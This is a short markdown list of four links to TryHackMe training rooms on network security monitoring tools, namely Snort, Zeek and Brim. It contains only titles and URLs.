- [**Snort Challenge: Live Attacks**](https://tryhackme.com/room/snortchallenges2)
- [**Zeek**](https://tryhackme.com/room/zeekbro)
- [**Zeek Exercises**](https://tryhackme.com/room/zeekbroexercises)
- [**Brim**](https://tryhackme.com/room/brim)

